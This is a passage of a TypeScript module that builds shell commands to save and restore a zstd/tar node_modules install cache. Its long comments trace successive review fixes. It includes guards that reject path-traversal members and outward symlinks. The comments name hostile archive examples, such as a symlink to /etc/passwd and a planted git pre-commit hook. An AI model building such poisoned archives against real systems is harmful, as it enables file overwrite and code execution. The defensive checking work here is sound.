// The SAME replacement also closes a second, opposite-shaped miss the old
// component (b) had: a PAUSED install (a real install process still alive,
// but stalled — a slow registry fetch, network back-pressure — with no
// filesystem write for longer than `INSTALL_ACTIVITY_WINDOW_SECONDS`) looks
// IDENTICAL, from pure mtimes alone, to a genuinely finished one the instant
// its own lockfile write happens to already be older than `node_modules`
// (the ordinary case for anything but the first few seconds of a fresh
// install) — measured: 5 half-written `node_modules` trees saved this way.
//
// Fixed by replacing component (b) ENTIRELY with a live-PROCESS check —
// package-manager-agnostic (no argv keyword to spell, closing the exact gap
// round 3's own argv-matching removal already fixed for component (a)'s
// sibling) and process-lifetime-scoped rather than mtime-scoped: is there a
// process, ANYWHERE in this container, whose own binary is bun/node/npm/npx/
// yarn/pnpm (npm and classic yarn both commonly run AS `node` running a
// `.js` entrypoint — checked live in this sandbox — so `node` is included,
// not just the package-manager binaries' own names) and whose cwd IS `dir`,
// OR whose argv contains `dir` as one of its OWN arguments (the `--cwd
// <dir>`-from-elsewhere shape round 3's own doc comment names explicitly —
// matched as a WHOLE argv element via `grep -x`, not a substring, so this
// never fires on an unrelated argument that merely CONTAINS `dir`'s text as
// part of a longer string)? This self-heals the "stuck forever" bug
// immediately once the real process actually exits (no mtime to go stale
// forever), and catches the "paused" case too (the process is still alive
// and still resident in /proc, mtimes or not, for exactly as long as it
// genuinely has not finished). Component (a) (recent write activity) is
// UNCHANGED — it already covers the extraction-phase majority of a real
// install's wall-clock time, package-manager-agnostically, and nothing about
// this fix touches its own reasoning.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Round 5 review, item 1 — round 4's own live-process signal above (comment
// block just above this one) is now judged OVER-BROAD by the maestro. It
// caught ANY live process named bun/node/npm/npx/yarn/pnpm with `dir` as its
// cwd or among its argv — not just an ACTUAL in-progress package-manager
// install. Measured live: a repo whose studio also runs a long-lived DEV
// SERVER (`bun run dev`, sitting in the repo root for the studio's whole
// lifetime) or an MCP SERVER started via `bun x` FROM the repo root (real on
// fleetflare--web-studio) matches this signal identically to a genuine
// mid-flight install — so a root-lockfile repo running either of those NEVER
// saves its install cache at all, forever, not merely during a real install.
//
// Fixed by DROPPING the live-process signal entirely — no more `/proc`
// scanning, no more package-manager-binary matching, of any kind — in favor
// of a COMPLETION MARKER: `node_modules/.fleet-install-complete`, touched by
// a NEW PostToolUse hook (gates/install-marker.sh, wired in
// studio-bringup.sh) right after a real package-manager install command
// finishes in a directory and looks like it actually succeeded. This
// function now asks a purely filesystem-shaped question instead of scanning
// live processes at all: does that marker exist, and is it NEWER than every
// real lockfile in the directory (never stale)? Settled (marker present and
// fresh) reads as "not running", exactly as absent/stale reads as "still
// running/never completed" — matching this guard's own long-standing bias
// toward FALSE POSITIVES (looks running when it just finished) over false
// negatives (round 2 review, item 3's own doc comment on this whole guard):
// a missing/stale marker costs one skipped save tick, never a corrupted
// upload.
//
// WHY A HOOK, NOT FLEET'S OWN CODE: unchanged from round 4's own reasoning
// (this file's header) — installs run inside the lead's own interactive/
// agentic container session, and fleet's Worker/DO code has no invocation
// site of its own to wrap. The Bash tool call itself is the one place that
// reliably sees every `bun install` (or npm/yarn/pnpm equivalent) a lead or
// member ever runs — see gates/install-marker.sh's own header for exactly
// how it turns that into a marker, INCLUDING the honest limitation that
// Claude Code's own PostToolUse hook payload for Bash does not carry an exit
// code at all (verified against Claude Code's own hooks documentation), so
// "did this install actually succeed" is a best-effort heuristic there, not
// a certainty. This function does not need to know or care how the marker
// got there — it is deliberately as dumb as `nodeModulesPresentCmd` above:
// existence plus one mtime comparison, nothing else.
//
// Component (a) (recent write activity under node_modules) is UNCHANGED —
// it already covers the extraction-phase majority of a real install's
// wall-clock time, package-manager-agnostically, and neither a dev server
// nor an MCP server routinely writes into node_modules the way an
// in-progress install does, so it was never the source of the over-blocking
// bug this fix closes.
// ---------------------------------------------------------------------------

/** The filename `gates/install-marker.sh` touches under a directory's own
 *  `node_modules` once a real package-manager install there looks complete —
 *  see that file's own header for exactly when/how, and this section's
 *  comment above for why a hook writes it rather than fleet's own code. */
export const INSTALL_COMPLETE_MARKER = ".fleet-install-complete";

export function bunInstallRunningCmd(dir: string): string {
  const quoted = shQuote(dir);
  const markers = WORKSPACE_LOCK_MARKERS.join(" ");
  const marker = `node_modules/${INSTALL_COMPLETE_MARKER}`;
  return (
    `(cd ${quoted} 2>/dev/null || { echo no; exit 0; }; ` +
    `recent=no; ` +
    `if [ -d node_modules ] && [ -n "$(find node_modules -newermt '-${INSTALL_ACTIVITY_WINDOW_SECONDS} seconds' -print -quit 2>/dev/null)" ]; then recent=yes; fi; ` +
    `settled=no; ` +
    `if [ -f ${marker} ]; then ` +
    `stale=no; ` +
    `for f in ${markers}; do [ -f "$f" ] && [ "$f" -nt ${marker} ] && stale=yes; done; ` +
    `if [ "$stale" = no ]; then settled=yes; fi; ` +
    `fi; ` +
    `if [ "$recent" = yes ] || [ "$settled" = no ]; then echo yes; else echo no; fi)`
  );
}

/** `bunInstallRunningCmd`'s stdout, trimmed: `true` for a genuine "yes",
 *  `false` for anything else (including a malformed/empty exec result — the
 *  safe default is "not running" only in the sense that this function
 *  refuses to CLAIM certainty it doesn't have; the caller that uses this to
 *  gate a save already treats "no signal either way" the same as "no", by
 *  design, since blocking every save forever on an exec hiccup would be
 *  strictly worse than the rare install-mid-save race this guard exists to
 *  catch). */
export function parseBunInstallRunning(stdout: string): boolean {
  return stdout.trim() === "yes";
}

// ---------------------------------------------------------------------------
// Transport commands — the container-side halves of the restore/save paths.
// The presigned URL is NEVER interpolated into the command string (it would
// sit in `bash -c`'s argv, visible to `ps`, and come back verbatim in a
// `Killed <command>` line on a timeout — sandbox-api.ts's sbExec doc comment
// states this rule for FLEET_TOKEN_ENV/credentials.ts's identical posture,
// and it applies just as much to a signed URL, which is itself a bearer
// credential for the object it names). It travels only in the exec's `env`
// option, under INSTALL_CACHE_URL_ENV, read back by the shell as
// `"$INSTALL_CACHE_URL"`.
// ---------------------------------------------------------------------------

export const INSTALL_CACHE_URL_ENV = "INSTALL_CACHE_URL";

/** Round 5 review, item 4, RECOMPUTED in round 6 review, item 3 — how many
 *  multiples of the DOWNLOADED (compressed) archive's own size must be free
 *  on `$work`'s filesystem before `installCacheRestoreCmd` attempts the
 *  zstd/tar stages that write to it.
 *
 *  Round 5's own value here was 8, sized for `$work` holding, briefly, BOTH
 *  the fully decompressed `dl.tar` AND the extracted `stage/node_modules`
 *  copy ALONGSIDE the original compressed download — i.e. roughly TWO full
 *  copies of the decompressed content at once. The maestro measured this as
 *  still BLOCKER-severity insufficient: a real `node_modules` tree's own
 *  measured decompression ratio is ~4.2x, so that old shape's real peak need
 *  was ~2 * 4.2 = 8.4x — just OVER the round-5 constant's own 8x, letting
 *  some restores past the preflight that then genuinely ran out of space
 *  partway into the zstd/tar stages, misattributed as `"archive"` corruption
 *  and tombstoning a perfectly good remote object.
 *
 *  Round 6's own fix restructures the pipeline itself (this function's own
 *  doc comment, item 4) to STREAM zstd's decompression directly into tar,
 *  twice — once for listing, once for extraction — never writing a full
 *  decompressed `dl.tar` to disk at all. The new peak is just ONE copy of the
 *  decompressed content (the extracted `stage/node_modules` copy) alongside
 *  the original compressed download, roughly HALF of round 5's own shape.
 *  Recomputed from the same measured 4.2x ratio, plus a genuine safety
 *  margin this time (round 5's own mistake was landing just UNDER the real
 *  need, not over it): 5x. Skipping a restore that might have JUST fit still
 *  costs only one skipped restore attempt, while under-estimating risks the
 *  exact archive-vs-local misattribution this whole fix exists to close —
 *  the same asymmetric reasoning round 5's own version of this doc comment
 *  already stated, just with a tighter, correctly-derived number this time. */
export const INSTALL_CACHE_RESTORE_DISK_SAFETY_MULTIPLIER = 5;

/**
 * Restore. Round 2 review, items 2 and 4 rewrote this from a single
 * `curl | zstd -d | tar -x -C <dir>` pipe into a materialize-validate-move
 * pipeline — costs more temp disk (the compressed object AND its
 * decompressed tar both land on disk briefly, on top of the staged
 * `node_modules` itself), bought back with two guarantees the old pipe could
 * not give:
 *
 *   Item 2 (truncated download atomicity): `curl -o` (never a bare pipe)
 *   writes to a named temp file and `&&`-chains into the next step — a
 *   truncated transfer (a killed exec, a dropped connection) makes `curl`
 *   itself exit nonzero (`--fail` plus curl's own Content-Length check) and
 *   the whole chain short-circuits before ANYTHING is extracted, let alone
 *   moved into `dir`. `set -o pipefail` is kept as belt-and-suspenders for
 *   any pipe a future edit reintroduces; nothing in the chain below actually
 *   depends on it, since every stage now materializes to a file and gates
 *   the next stage through its own exit code.
 *
 *   Item 4 (SECURITY — the most important item): the archive is NEVER
 *   extracted into `dir` directly. It lands in a throwaway `mktemp -d`
 *   staging area first, and only `stage/node_modules` — the one thing this
 *   feature is allowed to touch — is `mv`d into `dir` at the very end, once
 *   every check above has passed. Two independent guards sit in front of
 *   that move, verified against this sandbox's real GNU tar rather than
 *   assumed:
 *     (a) `tar --absolute-names -tf` (LISTING only, never used to extract)
 *         shows every member's TRUE stored path, bypassing GNU tar's own
 *         helpful (but silent, and not guaranteed by every tar
 *         implementation) stripping of a leading `/` during ordinary
 *         listing/extraction. Any member matching `^/` (an absolute path)
 *         or a `..` path segment is rejected before anything is extracted
 *         at all — verified live: a hand-built archive with an
 *         absolute-path member and one with a `../../..` traversal member
 *         each produced exactly the marker this regex catches, independent
 *         of whatever default protection this tar binary happens to ship.
 *     (b) the actual extraction (`tar -x -f archive node_modules`) names
 *         `node_modules` as the ONLY member to extract — verified live in
 *         this sandbox's GNU tar that this genuinely limits extraction to
 *         that one path and everything under it, even when the archive also
 *         contains other top-level entries (a poisoned archive with
 *         `src/app.ts` and a planted `.git/hooks/pre-commit` alongside a
 *         legitimate `node_modules/` extracts ONLY `node_modules/`, the
 *         other two members are never written anywhere).
 *   `[ -d "$stage/node_modules" ]` after extraction closes the one gap
 *   member-filtering alone doesn't: an archive with NO `node_modules` member
 *   at all "succeeds" at extracting zero bytes rather than failing, so this
 *   checks that something real actually landed before the `mv`.
 *
 *   Round 6 review, item 3 — STREAMED decompression, not a materialized
 *   `dl.tar`. Round 2 through round 5 decompressed the WHOLE archive to a
 *   real `$work/dl.tar` file (`zstd -dc ... > "$work/dl.tar"`) before either
 *   listing OR extracting it — needing that full decompressed copy AND the
 *   extracted `stage/node_modules` copy to coexist on disk at once, which is
 *   most of what made round 5's own disk-safety multiplier insufficient (see
 *   `INSTALL_CACHE_RESTORE_DISK_SAFETY_MULTIPLIER`'s own doc comment). Fixed
 *   by decompressing the SAME compressed download TWICE via a streamed pipe,
 *   never through an intermediate file: once piped into `tar -tf -` for the
 *   listing pass above (item (a)), and — only if THAT passes the traversal
 *   check — a SECOND time piped into `tar -x -f -` for the real extraction
 *   (item (b)). This preserves the load-bearing property item (a) exists
 *   for — the traversal guard still runs, and still refuses the WHOLE
 *   operation, before a single byte is ever extracted — while never writing
 *   a full decompressed archive to disk at either stage: only the original
 *   compressed download and the final extracted copy ever touch `$work`.
 *   Costs one extra CPU-bound zstd decompression pass (cheap relative to the
 *   network transfer this whole command already waits on) for roughly HALF
 *   the peak disk usage. Neither streamed stage's own diagnostic output ever
 *   touches disk either: the extraction stage's stderr is captured IN MEMORY
 *   (`err=$( { cmd; } 2>&1 >/dev/null )`, round 7 review), and the listing
 *   stage's own real stdout (the listing itself, not just its stderr) is
 *   ALSO captured in memory the same way (`listing=$( { cmd; } 2>&1 )`,
 *   issue #387 — a FILE capture of either, on the same possibly-full
 *   filesystem being diagnosed, can itself fail to write, silently losing
 *   the very ENOSPC report this exists to classify) so a failure can be
 *   classified: tar's own ENOSPC-shaped message (or the raw errno text) in
 *   either stage's own captured output is `restore-failed:local` (defense in
 *   depth — even with a tighter, more accurate preflight above, an imperfect
 *   estimate could still let a real ENOSPC through), anything else at either
 *   streamed stage is `restore-failed:archive`, exactly as before.
 *
 * `mkdir -p ${dir}` up front: `runProvision`/`runRestart` clone before this
 * runs, so `dir` already exists in practice, but a restore call in isolation
 * (a future caller, a test) should not depend on that.
 *
 * `maxTimeSeconds` (round 6 review, item 2) — the curl leg's own `--max-time`,
 * defaulting to 600 (this feature's own long-standing single-directory
 * ceiling) but overridable per call. `runInstallCacheRestore`'s own loop
 * passes the ACTUAL remaining wall-clock budget (capped at 600) for a
 * directory starting late in a multi-directory restore, rather than always
 * granting the full 600s regardless of how little budget is actually left —
 * see `runInstallCacheRestore`'s own doc comment, and the doc comment on the
 * (now-deleted) `INSTALL_CACHE_RESTORE_DIR_WORST_CASE_MS` constant just above
 * `INSTALL_CACHE_RESTORE_BUDGET_MS`, for the round-5 bug this closes.
 *
 * Round 4 review, item 1 — STAGE MARKERS. Before this, a restore failure was
 * just a nonzero exit code with no way to tell WHY: a transient network blip
 * on the `curl` leg (the object is probably fine, worth trying again next
 * tick) reads identically to the archive itself being corrupt (zstd-invalid,
 * tar-invalid, or failing the traversal check — the object is BAD and every
 * future studio that ever computes this same lockHash will keep failing
 * against it forever, since nothing ever overwrites a bad object at a
 * lockHash that hasn't itself changed). Every stage from `curl` onward now
 * `||`-guards its own failure with an explicit `echo restore-failed:<stage>`
 * before exiting, so `restoreOneDir` below can tell the two apart and only
 * TOMBSTONE (delete) the R2 object for the second kind — see
 * `parseRestoreFailureReason`'s own doc comment just below this function.
 *
 * The whole body is wrapped in one `(...)` — this file's own established
 * rule for any command using a bare `exit` (`bunInstallRunningCmd`'s own
 * `(cd ... || { echo no; exit 0; })` is the precedent): `sbExec` runs each
 * command against a per-session shell that PERSISTS across calls (see
 * `discoverCacheDirsCmd`'s own doc comment on why an un-subshelled `cd`
 * "leaks" the same way), so a bare top-level `exit` here would end that
 * session's own shell, not just this one restore attempt — the SDK recovers
 * transparently by starting a fresh session on the next call, but every one
 * of THIS stage-marker `exit 1`s firing on an ordinary, non-adversarial
 * restore failure (a slow network, a bad signature) would silently restart
 * it regardless. A subshell scopes every `exit` (and `set -o pipefail`,
 * `trap ... EXIT`) to this one command, exactly as before this fix, with
 * none of that risk.
 */
export function installCacheRestoreCmd(dir: string, maxTimeSeconds: number = 600): string {
  return (
    `(set -o pipefail && ` +
    `work=$(mktemp -d /tmp/.install-cache-restore.XXXXXX) && ` +
    `trap 'rm -rf "$work"' EXIT && ` +
    `{ mkdir -p ${shQuote(dir)} || { echo restore-failed:precondition; exit 1; }; } && ` +
    `{ curl --fail --silent --show-error --connect-timeout 30 --speed-limit 1024 --speed-time 60 --max-time ${maxTimeSeconds} ` +
    `-o "$work/dl.tar.zst" "$${INSTALL_CACHE_URL_ENV}" || { echo restore-failed:transfer; exit 1; }; } && ` +
    // Round 5 review, item 4 (recomputed round 6, item 3) — SECURITY/
    // CORRECTNESS: a LOCAL out-of-disk-space condition on this studio's own
    // container must never be mistaken for the remote archive being corrupt.
    // Every stage below this point WRITES to local disk (the streamed zstd/
    // tar listing pass, then the streamed zstd/tar extraction pass — see this
    // function's own doc comment, item 4, for why NEITHER stage materializes
    // a full decompressed archive on disk anymore) — before round 5's own
    // fix, an ENOSPC on either of those writes fell through to the exact same
    // `restore-failed:archive` marker a genuinely corrupt object produces,
    // and `parseRestoreFailureReason` treats every "archive" reason as
    // grounds to TOMBSTONE (delete) the R2 object — deleting a perfectly
    // good object shared by every OTHER studio of this repo, for a failure
    // that had nothing to do with its content.
    //
    // Checked here, BEFORE the risky writes, using the DOWNLOADED archive's
    // own size (already materialized on disk by the curl leg above — never a
    // second round trip) against `df -Pk`'s own reported available space on
    // the SAME filesystem `$work` lives on (POSIX `-P` format is portable
    // across the coreutils/busybox split this container's own base image
    // could ship either half of; the 4th whitespace-separated field of its
    // one data line is "Available", in 1024-byte blocks). The multiplier
    // (see its own doc comment for the round-6 recompute) now accounts for
    // just ONE larger copy existing on `$work` at a time — the extracted
    // `stage/node_modules` copy the streamed extraction pass produces —
    // rather than round 5's own two-copies-at-once shape, since the streamed
    // pipeline below never materializes a full decompressed archive on disk.
    // This preflight would still rather skip a restore that might have JUST
    // fit than let a real ENOSPC land mid-write and get mislabeled — and,
    // as defense in depth against an imperfect estimate, both streamed
    // stages below ALSO classify their own literal "No space left on device"
    // stderr as `restore-failed:local` even if this preflight lets them run.
    //
    // Fails OPEN (never blocks) when `df` itself is missing/unparseable —
    // this is a best-effort preflight, not a new way for a healthy restore to
    // fail; a genuine ENOSPC that slips past an unreadable `df` still fails
    // later, just with the pre-existing (less precise) "archive" label this
    // fix cannot help in that one degraded case.
    `{ dl_size=$(stat -c%s "$work/dl.tar.zst" 2>/dev/null || echo 0); ` +
    `avail_kb=$(df -Pk "$work" 2>/dev/null | tail -1 | awk '{print $4}'); ` +
    `if [ -n "$avail_kb" ] && [ "$avail_kb" -eq "$avail_kb" ] 2>/dev/null; then ` +
    `avail_bytes=$((avail_kb * 1024)); needed=$((dl_size * ${INSTALL_CACHE_RESTORE_DISK_SAFETY_MULTIPLIER})); ` +
    `if [ "$avail_bytes" -lt "$needed" ]; then echo restore-failed:local; exit 1; fi; ` +
    `fi; } && ` +
    // Round 6 review, item 3 — LISTING pass: decompress via a streamed pipe
    // directly into `tar -tf -` (never through an intermediate `$work/dl.tar`
    // file — see this function's own doc comment, item 4). An ENOSPC report
    // in this stage's own combined stderr is `restore-failed:local` (defense
    // in depth), anything else is `restore-failed:archive`, exactly as a
    // materialized-file failure was before this fix.
    //
    // Round 7 review — BLOCKER: this stage's stderr used to land in a FILE,
    // `$work/list.err`, living on the exact same filesystem `df` above just
    // checked. On a REAL full disk (proven live by the maestro's own
    // reviewer against a real docker full tmpfs), the write that CREATES
    // that error-capturing file can itself fail — silently, since a failed
    // redirect target just produces nothing to grep — leaving a 0-byte or
    // missing `list.err`, so the ENOSPC report tar/zstd tried to print is
    // NEVER SEEN, this stage falls through to `restore-failed:archive`
    // regardless, and a perfectly good remote object gets tombstoned for a
    // failure that was this studio's own disk. Fixed by capturing stderr
    // IN-MEMORY, via command substitution, instead of a file: `{ cmd; } 2>&1
    // >/dev/null` inside `err=$(...)` redirects the group's real stdout away
    // (already going to `$work/listing.txt` via tar's OWN, per-command `>`,
    // untouched by this) while stderr — never redirected by either zstd or
    // tar individually — inherits the group's own `2>&1`, landing in the
    // shell variable `err` a pipe write, not a disk write, and therefore
    // immune to ENOSPC on `$work`'s own filesystem regardless of how full it
    // is. Verified against real tar (not just read): both the success shape
    // (`err` empty, `listing.txt` genuinely populated) and a real tar/zstd
    // failure (`err` correctly captures BOTH commands' own stderr) before
    // shipping this.
    //
    // My own round-6 follow-up (kept, still correct here): the ENOSPC
    // pattern is NOT just the raw `strerror(ENOSPC)` text ("No space left on
    // device") — verified live in this sandbox against real `GNU tar 1.34`
    // (this container's own version) extracting into a 1MB tmpfs: tar wraps
    // a failed write in its OWN message, `tar: <member>: Wrote only N of M
    // bytes`, and never prints the raw errno string at all.
    //
    // Issue #387 (round-7 follow-up) — BLOCKER: this stage used to write the
    // listing itself to a FILE, `$work/listing.txt` — the round-7 fix above
    // only moved this stage's STDERR capture off disk, not its real stdout
    // (the listing content). A disk-full failure DURING that listing.txt
    // write is a DIFFERENT failure than either pattern above: verified live
    // (filled a real tmpfs to zero available bytes, ran this exact listing
    // pipe against it) that GNU tar's own message for a failed WRITE TO ITS
    // OWN STDOUT during `-tf` listing mode is `tar: stdout: write error` —
    // neither "wrote only N of M bytes" (specific to failed EXTRACTED FILE
    // CONTENT writes during `-x`) nor the raw errno text ever appears. That
    // message matched nothing here, so a listing-pass ENOSPC still fell
    // through to `restore-failed:archive`, tombstoning a good object — the
    // exact bug round 7 closed for the extraction stage, still open one
    // stage earlier. Reproduced against the FULL pipeline, preflight
    // included, not just tar in isolation: a payload whose file COUNT (and
    // therefore listing size) is disproportionate to its own compressed size
    // — verified live, 6,000 trivial files compress to ~47.7KB but list at
    // ~660KB — defeats the preflight's own multiplier just as easily as a
    // real large `node_modules` with many small files legitimately can,
    // reaching this stage's own write for real.
    //
    // Fixed the same way round 7 fixed stderr: the listing itself now lives
    // in a shell variable, `listing=$( { cmd; } 2>&1 )`, never a file — a
    // pipe write into the command-substitution's own capture, immune to
    // ENOSPC on `$work`'s filesystem regardless of how full it is. Verified
    // live that a clean, successful listing with `--absolute-names` produces
    // ZERO stderr output, so on success `$listing` is pure, safe member-name
    // text for the traversal-guard grep below; on failure it holds whatever
    // partial names printed plus the interleaved error text, used only for
    // the archive-vs-local classification, never for the traversal check
    // (that branch already exits before reaching it). `stdout: write error`
    // added to the pattern too, as defense in depth, even though this fix
    // makes it structurally unreachable here (tar's own stdout is now a pipe
    // into the capture, never a disk file) — matching every OTHER ENOSPC
    // check in this function already stacking a pattern match behind its own
    // structural fix, never relying on just one.
    //
    // My own follow-up, found only by actually running this against a real
    // 660KB listing (not a short one): `grep -q` reads only as far as its
    // FIRST match, then exits immediately — for a `cmd | grep -q` PIPE larger
    // than the kernel pipe buffer (64KB on Linux), that early exit closes the
    // read end while the WRITER (`echo`/`printf`) is still blocked mid-write,
    // killing it with SIGPIPE. `set -o pipefail` (active for this whole
    // command) then reports the PIPELINE as failed because of the writer's
    // SIGPIPE death — even though `grep` itself found the match and would
    // have returned 0 — flipping a genuine `restore-failed:local` back to
    // `restore-failed:archive` for a large listing purely from the size of
    // the false-positive content. Verified live: `grep -c` (reads to EOF, no
    // early exit) finds the match correctly on the exact same content;
    // `grep -q` on a plain pipe does not. Fixed by feeding grep through
    // process substitution (`<(printf '%s' "$var")`) instead of a literal
    // `|` pipe stage: `<(...)`'s own exit status is never part of the
    // enclosing pipefail computation, so an early-closing reader can no
    // longer flip the result. Applied to every grep-on-a-captured-variable
    // check in this function, not just this one — the traversal guard right
    // below reads the SAME potentially-large `$listing`.
    // Issue #395 review round 2: folded into this ONE listing pass — `-tvf`
    // (verbose) instead of the old plain `-tf`, so a single decompression
    // covers both the member-NAME traversal check AND the symlink-TARGET
    // check below, never a second full decompress of a 0.5-1.1 GiB archive
    // just to see `-> target` text `-tf` doesn't print.
    `{ listing=$( { zstd -dc "$work/dl.tar.zst" | tar --absolute-names -tvf -; } 2>&1 ) || ` +
    `{ if grep -qiE 'no space left on device|wrote only [0-9]+ of [0-9]+ bytes|stdout: write error' <(printf '%s' "$listing"); then echo restore-failed:local; else echo restore-failed:archive; fi; exit 1; }; } && ` +
    // Issue #395, item 4 — SECURITY (outward symlink), folded in here after
    // review round 2. A `-tf` traversal check on member NAMES alone misses
    // symlink TARGETS entirely: `node_modules/passwd -> /etc/passwd` has a
    // perfectly ordinary, non-traversal NAME — the escape lives only in the
    // target, visible via `-tv`'s own `name -> target` form (verified live
    // against this sandbox's real GNU tar). This one awk pass, run over the
    // SAME `-tv` listing already captured above, replaces the old bare-name
    // grep AND adds the target check, per line: strip the fixed 5-token
    // `-tv` prefix (perm/owner/size/date/time) to recover the real member
    // path; an absolute or `..`-containing NAME is rejected exactly as the
    // old check did; for a symlink (a ` -> ` separator present — the
    // rightmost one, so a hostile name containing that literal text can
    // never shift which half is judged as the target), reject an absolute
    // target outright.
    //
    // For a RELATIVE target, depth is measured from the CHECKOUT ROOT, not
    // from `node_modules` — review round 2's own fix: a hoisted monorepo
    // linker plants `node_modules/core -> ../packages/core` (one level up
    // from `node_modules` lands back at the checkout root, still inside
    // it), which a node_modules-relative depth wrongly rejected, silently
    // breaking every cache restore for a real workspace repo (measured
    // live: example.app, 8700 real symlinks). The member's OWN path
    // (`node_modules/...`, never stripped) sets the budget: a target's
    // leading run of `..` may not exceed that path's own directory depth
    // (climbing back out past the checkout root), and a `..` is never
    // allowed AFTER a real path segment (no legitimate shim or workspace
    // link ever goes down then back up). Verified against all 19 real
    // symlinks in this repo's own `apps/fleet/node_modules`, a real
    // workspace-shaped link, the named absolute attack, and several
    // relative-only escape variants (all correctly rejected) before wiring
    // this in.
    `{ symlinkHit=$(awk '{line=$0;rest=line;for(i=0;i<5;i++){sub(/^[ \\t]+/,"",rest);sub(/^[^ \\t]+/,"",rest)}sub(/^[ \\t]+/,"",rest);sep=" -> ";pos=-1;start=1;while(1){p=index(substr(rest,start),sep);if(p==0)break;pos=start+p-1;start=pos+1}if(pos==-1){name=rest;target=""}else{name=substr(rest,1,pos-1);target=substr(rest,pos+length(sep))}if(name~/^\\//){print "x";exit}n=split(name,nparts,"/");for(i=1;i<=n;i++){if(nparts[i]==".."){print "x";exit}}if(target=="")next;dn=split(name,dnparts,"/");depth=dn-1;if(target~/^\\//){print "x";exit}m=split(target,tparts,"/");seenReal=0;dots=0;mixed=0;for(i=1;i<=m;i++){c=tparts[i];if(c==""||c==".")continue;if(c==".."){if(seenReal){mixed=1;break}dots++}else seenReal=1}if(mixed||dots>depth){print "x";exit}}' <(printf '%s' "$listing")); } && ` +
    `{ if [ -n "$symlinkHit" ]; then echo restore-failed:archive; exit 1; fi; } && ` +
    `mkdir -p "$work/stage" && ` +
    // Round 6 review, item 3 — EXTRACTION pass: only reached once the
    // listing pass above has already run AND passed the traversal check, so
    // this decompresses the SAME compressed download a second time — never
    // reusing a materialized `.tar` (there isn't one) — piped directly into
    // `tar -x -f -`. Same ENOSPC-vs-archive stderr classification, and the
    // SAME round-7 in-memory-capture fix, as the listing pass above — this
    // stage's own real stdout is meaningless (`tar -x` extracts, it does not
    // need to print anything), so it is discarded to `/dev/null` rather than
    // preserved to a file the way the listing pass preserves its own. Also
    // the same `grep -q <(printf '%s' "$err")` process-substitution fix as
    // the listing pass's own check above (issue #387's own follow-up doc
    // comment there has the full pipefail/SIGPIPE explanation) — a real
    // multi-file extraction failure's own `$err` is easily large enough to
    // hit the identical bug.
    `{ err=$( { zstd -dc "$work/dl.tar.zst" | tar -x -C "$work/stage" -f - node_modules; } 2>&1 >/dev/null ) || ` +
    `{ if grep -qiE 'no space left on device|wrote only [0-9]+ of [0-9]+ bytes' <(printf '%s' "$err"); then echo restore-failed:local; else echo restore-failed:archive; fi; exit 1; }; } && ` +
    `{ [ -d "$work/stage/node_modules" ] || { echo restore-failed:archive; exit 1; }; } && ` +
    `{ rm -rf ${shQuote(dir)}/node_modules || { echo restore-failed:precondition; exit 1; }; } && ` +
    `{ mv "$work/stage/node_modules" ${shQuote(dir)}/node_modules || { echo restore-failed:precondition; exit 1; }; } && ` +
    `echo restored)`
  );
}

/**
 * `installCacheRestoreCmd`'s failure category, from its OWN stdout markers
 * (never from `stderr`/exit code alone — those don't distinguish stages):
 *
 *   - `"archive"` — the transfer itself SUCCEEDED (a real file landed) but
 *     what's inside is not a valid, safe archive: corrupt zstd, corrupt tar,
 *     a traversal member, or a valid-but-empty archive with no `node_modules`
 *     member at all. The object at this lockHash's key is BAD and will never
 *     restore for anyone — round 4 review, item 1's own tombstone decision.
 *   - `"transfer"` — `curl` itself never produced a complete file (a network
 *     blip, an expired/wrong-signature presigned URL, a `mkdir`/`rm`/`mv`
 *     precondition failure unrelated to the archive's own content). The
 *     object may well be perfectly fine; this reason is never grounds to
 *     delete it.
 *   - `"local"` — round 5 review, item 4: the download itself succeeded and
 *     this STUDIO's own local disk did not have enough free space to safely
 *     decompress/extract it (the preflight check `installCacheRestoreCmd`
 *     itself runs, right before the zstd/tar stages — see that function's own
 *     doc comment). This says NOTHING about the remote object's own content —
 *     a different studio with more free disk would restore it just fine — so,
 *     like `"transfer"`, this is never grounds to delete it. Kept as its OWN
 *     category rather than folded into `"transfer"` so a caller/operator can
 *     tell "the object might be bad" apart from "this container was out of
 *     room" at a glance, without needing to be identical in every other way.
 *   - `"unknown"` — no marker at all (a killed exec, a wedged sandbox, stdout
 *     truncated before the failing stage's own echo ran). Treated exactly
 *     like `"transfer"`/`"local"` — never tombstone on a reason this function
 *     cannot positively attribute to the archive itself.
 */
export function parseRestoreFailureReason(stdout: string): "archive" | "transfer" | "local" | "unknown" {
  const trimmed = stdout.trim();
  if (trimmed.includes("restore-failed:archive")) return "archive";
  if (trimmed.includes("restore-failed:transfer") || trimmed.includes("restore-failed:precondition")) return "transfer";
  if (trimmed.includes("restore-failed:local")) return "local";
  return "unknown";
}

/** Bytes cap on the SAVED (compressed) object — #350's own "Size cap: 1.5
 *  GiB", enforced here, before the upload, not left to R2 to refuse
 *  post-transfer. Per DIRECTORY, the redesign's own unit of caching — a
 *  monorepo with several cached directories may have several archives each
 *  up to this cap, not one combined cap across all of them. */
export const INSTALL_CACHE_MAX_BYTES = Math.floor(1.5 * 1024 * 1024 * 1024);

/**
 * Save: the reverse of installCacheRestoreCmd, plus everything item 3's
 * review named:
 *
 *   - a unique temp filename (`mktemp`, not a fixed path) — a fixed path
 *     collides the moment two directories' saves (this redesign's own new
 *     possibility: a multi-directory repo's sync tick can attempt several
 *     saves) or two ticks ever overlap.
 *   - EVERY stage's own exit code checked explicitly, chained with `&&`, in
 *     place of the old `2>/dev/null` on both `tar` and `zstd` with nothing
 *     ever reading `$?` afterward — a disk-full mid-tar or an OOM-killed
 *     zstd used to be silently treated as "produced a (possibly truncated)
 *     file", not a failure.
 *   - the staged archive is independently VERIFIED before it is ever PUT:
 *     `zstd -t` checks the compressed frame's own integrity (catches a
 *     truncated/corrupt zstd stream), and `zstd -dc | tar -tf -` checks that
 *     what's inside actually parses as a tar archive at all (catches a
 *     zstd-valid-but-garbage-inside archive `zstd -t` alone wouldn't).
 *
 * `[ -d <dir>/node_modules ]` guards the whole thing the same way
 * nodeModulesPresentCmd guards the restore side: nothing to save when there
 * is no node_modules yet (an early sync tick, before the lead's own install
 * has run) is not a failure, just nothing to do this tick — `echo
 * skip:no-node_modules` says so on stdout for the caller to log, exit 0.
 * `rm -f "$tmp"` is unconditional (chained with `;`, after the whole
 * conditional PUT block, so it runs whichever branch of it ran).
 *
 * SYMLINKS (round 3 review, smaller items — documented, not changed):
 * `tar` (both here and on the restore side) never passes `-h`/`--dereference`,
 * so it uses its own long-standing default of storing/recreating a symlink
